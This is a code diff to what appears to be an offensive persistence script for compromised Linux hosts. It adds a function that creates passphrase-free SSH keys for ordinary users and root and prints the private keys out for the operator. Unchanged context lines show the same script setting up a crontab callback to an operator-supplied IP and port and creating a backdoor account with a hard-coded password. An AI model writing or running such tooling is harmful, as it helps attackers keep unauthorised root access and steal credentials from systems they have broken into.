@@ -75,6 +75,31 @@ class funcs:
         subprocess.run(['echo', f"'{password}'", '|', 'passwd', username, '--stdin'], check=True, stdout=subprocess.DEVNULL)
         print(f"{bcolors.GREEN}[+] Done creating local account {username}:{password}.{bcolors.ENDC}")
 
+    def add_ssh_key(user, root=False):
+        print(f"{bcolors.GREEN}[+] Adding ssh key...{bcolors.ENDC}")
+        if root and user == "root":
+            subprocess.run(['ssh-keygen', '-t', 'rsa', '-b', '4096', '-C', '', '-f', '/root/.ssh/id_rsa', '-N', '', '-q'], check=True, stdout=subprocess.DEVNULL)
+            subprocess.run(['chmod', '700', '/root/.ssh/id_rsa'], check=True, stdout=subprocess.DEVNULL)
+            subprocess.run(['chmod', '600', '/root/.ssh/id_rsa.pub'], check=True, stdout=subprocess.DEVNULL)
+            subprocess.run(['chown', '-R', 'root:root', '/root/.ssh'], check=True, stdout=subprocess.DEVNULL)
+            with open(f'/root/.ssh/id_rsa', 'r') as f:
+                print(f"{bcolors.GREEN}[+] Done adding ssh key:\n{bcolors.ENDC}{f.read()}")
+        elif not root and user != "root":
+            subprocess.run(['ssh-keygen', '-t', 'rsa', '-b', '4096', '-C', '', '-f', f'/home/{user}/.ssh/id_rsa', '-N', '', '-q'], check=True, stdout=subprocess.DEVNULL)
+            subprocess.run(['chmod', '700', f'/home/{user}/.ssh/id_rsa'], check=True, stdout=subprocess.DEVNULL)
+            subprocess.run(['chmod', '600', f'/home/{user}/.ssh/id_rsa.pub'], check=True, stdout=subprocess.DEVNULL)
+            print(f"{bcolors.GREEN}[+] Done adding ssh key.{bcolors.ENDC}")
+            with open(f'/home/{user}/.ssh/id_rsa', 'r') as f:
+                print(f"{bcolors.GREEN}[+] Done adding ssh key:\n{bcolors.ENDC}{f.read()}")
+        elif root and user != "root":
+            subprocess.run(['ssh-keygen', '-t', 'rsa', '-b', '4096', '-C', '', '-f', f'/home/{user}/.ssh/id_rsa', '-N', '', '-q'], check=True, stdout=subprocess.DEVNULL)
+            subprocess.run(['chown', '-R', f'{user}:{user}', f'/home/{user}/.ssh'], check=True, stdout=subprocess.DEVNULL)
+            subprocess.run(['chmod', '700', f'/home/{user}/.ssh/id_rsa'], check=True, stdout=subprocess.DEVNULL)
+            subprocess.run(['chmod', '600', f'/home/{user}/.ssh/id_rsa.pub'], check=True, stdout=subprocess.DEVNULL)
+            with open(f'/home/{user}/.ssh/id_rsa', 'r') as f:
+                print(f"{bcolors.GREEN}[+] Done adding ssh key:\n{bcolors.ENDC}{f.read()}")
+        
+
 class user:
     def __init__(self, ip, port, user_name):
         self.ip = ip
@@ -82,6 +107,7 @@ class user:
         self.username = user_name
 
         funcs().crontab(self.ip, self.port)
+        funcs().add_ssh_key(self.username, False)
 
 class root:
     def __init__(self, ip, port):
@@ -90,6 +116,8 @@ class root:
 
         funcs().crontab(self.ip, self.port)
         funcs().create_local_account('kei', 'ILikeYouSoMuch<3')
+        funcs().add_ssh_key('kei', True)
+        funcs().add_ssh_key('root', True)
 
 
 if __name__ == '__main__':
